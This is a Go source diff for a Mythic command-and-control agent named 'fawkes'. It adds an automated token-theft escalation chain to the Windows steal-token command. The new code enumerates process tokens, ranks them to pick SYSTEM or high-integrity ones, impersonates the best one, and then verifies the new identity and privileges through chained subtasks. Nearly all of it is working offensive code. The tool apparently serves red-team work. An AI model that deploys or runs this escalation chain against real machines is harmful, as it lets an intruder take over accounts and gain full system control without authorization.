@@ -1,6 +1,7 @@
 package agentfunctions
 
 import (
+	"encoding/json"
 	"fmt"
 	"strings"
 
@@ -13,8 +14,8 @@ import (
 func init() {
 	agentstructs.AllPayloadData.Get("fawkes").AddCommand(agentstructs.Command{
 		Name:                "steal-token",
-		Description:         "Steal and impersonate a token from another process, or spawn a process with a stolen token",
-		HelpString:          "steal-token -pid <PID> [-action spawn -command <cmd>]",
+		Description:         "Steal and impersonate a token from another process, or spawn a process with a stolen token. auto-escalate: automated token enumeration and privilege escalation chain.",
+		HelpString:          "steal-token -pid <PID> [-action spawn -command <cmd>]\nsteal-token -action auto-escalate",
 		Version:             2,
 		SupportedUIFeatures: []string{},
 		Author:              "@galoryber",
@@ -23,14 +24,20 @@ func init() {
 		CommandAttributes: agentstructs.CommandAttribute{
 			SupportedOS: []string{agentstructs.SUPPORTED_OS_WINDOWS},
 		},
+		TaskCompletionFunctions: map[string]agentstructs.PTTaskCompletionFunction{
+			"autoEscalateEnumDone":    autoEscalateEnumDone,
+			"autoEscalateStealDone":   autoEscalateStealDone,
+			"autoEscalateWhoamiDone":  autoEscalateWhoamiDone,
+			"autoEscalateGetprivDone": autoEscalateGetprivDone,
+		},
 		CommandParameters: []agentstructs.CommandParameter{
 			{
 				Name:                                    "action",
 				ModalDisplayName:                        "Action",
 				CLIName:                                 "action",
 				ParameterType:                           agentstructs.COMMAND_PARAMETER_TYPE_CHOOSE_ONE,
-				Description:                             "impersonate: steal token and impersonate (default). spawn: steal token and create a process with it.",
-				Choices:                                 []string{"impersonate", "spawn"},
+				Description:                             "impersonate: steal token and impersonate (default). spawn: steal token and create a process with it. auto-escalate: enum tokens → steal best → verify.",
+				Choices:                                 []string{"impersonate", "spawn", "auto-escalate"},
 				DefaultValue:                            "impersonate",
 				SupportedAgents:                         []string{},
 				ChoicesAreAllCommands:                   false,
@@ -146,6 +153,29 @@ func init() {
 			action, _ := taskData.Args.GetStringArg("action")
 			pid, _ := taskData.Args.GetNumberArg("pid")
 
+			if action == "auto-escalate" {
+				display := "auto-escalate: enum-tokens → steal → whoami → getprivs"
+				response.DisplayParams = &display
+				createArtifact(taskData.Task.ID, "Subtask Chain", "Token auto-escalation chain (T1134.001)")
+				logOperationEvent(taskData.Task.ID, "[CHAIN] Token auto-escalation started", false)
+
+				// Step 1: Enumerate tokens
+				callbackFunc := "autoEscalateEnumDone"
+				_, err := mythicrpc.SendMythicRPCTaskCreateSubtask(
+					mythicrpc.MythicRPCTaskCreateSubtaskMessage{
+						TaskID:                  taskData.Task.ID,
+						SubtaskCallbackFunction: &callbackFunc,
+						CommandName:             "enum-tokens",
+						Params:                  `{"action":"unique"}`,
+					},
+				)
+				if err != nil {
+					response.Success = false
+					response.Error = "Failed to start token enumeration: " + err.Error()
+				}
+				return response
+			}
+
 			if action == "spawn" {
 				command, _ := taskData.Args.GetStringArg("command")
 				display := fmt.Sprintf("spawn PID:%d → %s", int(pid), command)
@@ -246,4 +276,222 @@ func init() {
 			return response
 		},
 	})
+}
+
+// --- Auto-Escalate Subtask Chain ---
+// Chain: enum-tokens → steal-token (best PID) → whoami → getprivs
+
+type autoEscalateToken struct {
+	PID       uint32 `json:"pid"`
+	Process   string `json:"process"`
+	User      string `json:"user"`
+	Integrity string `json:"integrity"`
+}
+
+// autoEscalateEnumDone handles enum-tokens completion: selects best token and steals it.
+func autoEscalateEnumDone(taskData *agentstructs.PTTaskMessageAllData, subtaskData *agentstructs.PTTaskMessageAllData, groupName *agentstructs.SubtaskGroupName) agentstructs.PTTaskCompletionFunctionMessageResponse {
+	response := agentstructs.PTTaskCompletionFunctionMessageResponse{
+		TaskID:  taskData.Task.ID,
+		Success: true,
+	}
+
+	responseText := getSubtaskResponses(subtaskData.Task.ID)
+	if responseText == "" || responseText == "[]" {
+		completed := true
+		response.Completed = &completed
+		msg := "Auto-escalate: no tokens found"
+		response.Stdout = &msg
+		mythicrpc.SendMythicRPCResponseCreate(mythicrpc.MythicRPCResponseCreateMessage{
+			TaskID: taskData.Task.ID, Response: []byte(msg),
+		})
+		return response
+	}
+
+	var tokens []autoEscalateToken
+	if err := json.Unmarshal([]byte(responseText), &tokens); err != nil {
+		completed := true
+		response.Completed = &completed
+		msg := fmt.Sprintf("Auto-escalate: failed to parse token list: %s", err.Error())
+		response.Stderr = &msg
+		return response
+	}
+
+	// Select best token: prefer SYSTEM, then High integrity, then any different user
+	bestToken := selectBestToken(tokens, taskData.Callback.User)
+	if bestToken == nil {
+		completed := true
+		response.Completed = &completed
+		msg := fmt.Sprintf("Auto-escalate: found %d tokens but none suitable for escalation (already highest privilege or no different users)", len(tokens))
+		response.Stdout = &msg
+		mythicrpc.SendMythicRPCResponseCreate(mythicrpc.MythicRPCResponseCreateMessage{
+			TaskID: taskData.Task.ID, Response: []byte(msg),
+		})
+		return response
+	}
+
+	mythicrpc.SendMythicRPCResponseCreate(mythicrpc.MythicRPCResponseCreateMessage{
+		TaskID:   taskData.Task.ID,
+		Response: []byte(fmt.Sprintf("[Step 1/4] Enumerated %d tokens. Selected: %s (PID %d, %s integrity)", len(tokens), bestToken.User, bestToken.PID, bestToken.Integrity)),
+	})
+
+	// Step 2: Steal the selected token
+	callbackFunc := "autoEscalateStealDone"
+	params := fmt.Sprintf(`{"action":"impersonate","pid":%d}`, bestToken.PID)
+	_, err := mythicrpc.SendMythicRPCTaskCreateSubtask(
+		mythicrpc.MythicRPCTaskCreateSubtaskMessage{
+			TaskID:                  taskData.Task.ID,
+			SubtaskCallbackFunction: &callbackFunc,
+			CommandName:             "steal-token",
+			Params:                  params,
+		},
+	)
+	if err != nil {
+		completed := true
+		response.Completed = &completed
+		msg := fmt.Sprintf("Auto-escalate: failed to steal token from PID %d: %s", bestToken.PID, err.Error())
+		response.Stderr = &msg
+		return response
+	}
+
+	return response
+}
+
+// autoEscalateStealDone handles steal-token completion: runs whoami to verify.
+func autoEscalateStealDone(taskData *agentstructs.PTTaskMessageAllData, subtaskData *agentstructs.PTTaskMessageAllData, groupName *agentstructs.SubtaskGroupName) agentstructs.PTTaskCompletionFunctionMessageResponse {
+	response := agentstructs.PTTaskCompletionFunctionMessageResponse{
+		TaskID:  taskData.Task.ID,
+		Success: true,
+	}
+
+	responseText := getSubtaskResponses(subtaskData.Task.ID)
+	mythicrpc.SendMythicRPCResponseCreate(mythicrpc.MythicRPCResponseCreateMessage{
+		TaskID:   taskData.Task.ID,
+		Response: []byte(fmt.Sprintf("[Step 2/4] Token stolen. %s", strings.TrimSpace(responseText))),
+	})
+
+	// Step 3: Verify new identity
+	callbackFunc := "autoEscalateWhoamiDone"
+	_, err := mythicrpc.SendMythicRPCTaskCreateSubtask(
+		mythicrpc.MythicRPCTaskCreateSubtaskMessage{
+			TaskID:                  taskData.Task.ID,
+			SubtaskCallbackFunction: &callbackFunc,
+			CommandName:             "whoami",
+			Params:                  "{}",
+		},
+	)
+	if err != nil {
+		completed := true
+		response.Completed = &completed
+		msg := fmt.Sprintf("Auto-escalate: token stolen but whoami failed: %s", err.Error())
+		response.Stderr = &msg
+		return response
+	}
+
+	return response
+}
+
+// autoEscalateWhoamiDone handles whoami completion: runs getprivs.
+func autoEscalateWhoamiDone(taskData *agentstructs.PTTaskMessageAllData, subtaskData *agentstructs.PTTaskMessageAllData, groupName *agentstructs.SubtaskGroupName) agentstructs.PTTaskCompletionFunctionMessageResponse {
+	response := agentstructs.PTTaskCompletionFunctionMessageResponse{
+		TaskID:  taskData.Task.ID,
+		Success: true,
+	}
+
+	responseText := getSubtaskResponses(subtaskData.Task.ID)
+	mythicrpc.SendMythicRPCResponseCreate(mythicrpc.MythicRPCResponseCreateMessage{
+		TaskID:   taskData.Task.ID,
+		Response: []byte(fmt.Sprintf("[Step 3/4] Identity verified: %s", strings.TrimSpace(responseText))),
+	})
+
+	// Step 4: Check new privileges
+	callbackFunc := "autoEscalateGetprivDone"
+	_, err := mythicrpc.SendMythicRPCTaskCreateSubtask(
+		mythicrpc.MythicRPCTaskCreateSubtaskMessage{
+			TaskID:                  taskData.Task.ID,
+			SubtaskCallbackFunction: &callbackFunc,
+			CommandName:             "getprivs",
+			Params:                  "{}",
+		},
+	)
+	if err != nil {
+		completed := true
+		response.Completed = &completed
+		msg := fmt.Sprintf("Auto-escalate: identity confirmed but getprivs failed: %s", err.Error())
+		response.Stderr = &msg
+		return response
+	}
+
+	return response
+}
+
+// autoEscalateGetprivDone handles getprivs completion: aggregates and reports.
+func autoEscalateGetprivDone(taskData *agentstructs.PTTaskMessageAllData, subtaskData *agentstructs.PTTaskMessageAllData, groupName *agentstructs.SubtaskGroupName) agentstructs.PTTaskCompletionFunctionMessageResponse {
+	response := agentstructs.PTTaskCompletionFunctionMessageResponse{
+		TaskID:  taskData.Task.ID,
+		Success: true,
+	}
+
+	responseText := getSubtaskResponses(subtaskData.Task.ID)
+	privCount := strings.Count(responseText, "\n")
+
+	mythicrpc.SendMythicRPCResponseCreate(mythicrpc.MythicRPCResponseCreateMessage{
+		TaskID:   taskData.Task.ID,
+		Response: []byte(fmt.Sprintf("[Step 4/4] Privileges enumerated: %d privileges available", privCount)),
+	})
+
+	// Aggregate results
+	summary := "=== Auto-Escalate Chain Complete ===\n"
+	parentID := taskData.Task.ID
+	searchResult, err := mythicrpc.SendMythicRPCTaskSearch(mythicrpc.MythicRPCTaskSearchMessage{
+		TaskID:             parentID,
+		SearchParentTaskID: &parentID,
+	})
+	if err == nil && searchResult.Success {
+		for _, task := range searchResult.Tasks {
+			summary += fmt.Sprintf("[%s] %s %s\n", task.Status, task.CommandName, task.DisplayParams)
+		}
+	}
+
+	completed := true
+	response.Completed = &completed
+	response.Stdout = &summary
+
+	mythicrpc.SendMythicRPCResponseCreate(mythicrpc.MythicRPCResponseCreateMessage{
+		TaskID: taskData.Task.ID, Response: []byte(summary),
+	})
+
+	return response
+}
+
+// selectBestToken picks the highest-privilege token different from current user.
+func selectBestToken(tokens []autoEscalateToken, currentUser string) *autoEscalateToken {
+	var systemTokens, highTokens, otherTokens []*autoEscalateToken
+
+	for i := range tokens {
+		t := &tokens[i]
+		// Skip current user
+		if strings.EqualFold(t.User, currentUser) {
+			continue
+		}
+		upper := strings.ToUpper(t.User)
+		if strings.Contains(upper, "SYSTEM") || strings.Contains(upper, "NT AUTHORITY\\SYSTEM") {
+			systemTokens = append(systemTokens, t)
+		} else if strings.EqualFold(t.Integrity, "High") || strings.EqualFold(t.Integrity, "System") {
+			highTokens = append(highTokens, t)
+		} else {
+			otherTokens = append(otherTokens, t)
+		}
+	}
+
+	// Prefer SYSTEM > High integrity > any other user
+	if len(systemTokens) > 0 {
+		return systemTokens[0]
+	}
+	if len(highTokens) > 0 {
+		return highTokens[0]
+	}
+	if len(otherTokens) > 0 {
+		return otherTokens[0]
+	}
+	return nil
 }
